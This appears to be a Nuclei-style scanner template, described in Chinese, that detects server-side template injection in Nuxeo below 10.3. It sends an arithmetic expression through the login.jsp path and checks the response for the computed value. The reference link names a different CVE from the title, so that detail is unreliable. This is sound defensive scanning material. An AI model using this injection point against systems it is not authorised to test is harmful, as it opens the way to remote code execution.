id: nuxeo-ssti-rce

info:
  name: Nuxeo <10.3 - 远程代码执行漏洞（CVE-2018-16341）
  author: madrobot
  severity: high
  description: |-
    Nuxeo <10.3 存在安全漏洞。攻击者可通过 /nuxeo/login.jsp/pwn${31333333330+7}.xhtml 构造恶意输入，在服务器端执行任意命令或代码。该模板通过请求 /nuxeo/login.jsp/pwn${31333333330+7}.xhtml，并结合响应中的 31333333337 等特征进行验证。
  impact: |-
    - 攻击者可在目标服务器上执行任意命令或代码，直接接管受影响主机或应用进程。
    - 成功利用后可进一步窃取数据、植入后门、横向移动，或破坏关键业务系统。
  remediation: |-
    - 尽快将 Nuxeo <10.3 升级到厂商已发布的修复版本，并结合官方公告核对受影响版本范围。
    - 避免将外部输入直接传入执行链路，并通过白名单校验、最小权限与隔离运行降低命令执行风险。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-16299
  metadata:
    max-request: 1
  tags: nuxeo,ssti,rce,bypass,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/nuxeo/login.jsp/pwn${31333333330+7}.xhtml"

    matchers:
      - type: word
        part: body
        words:
          - "31333333337"
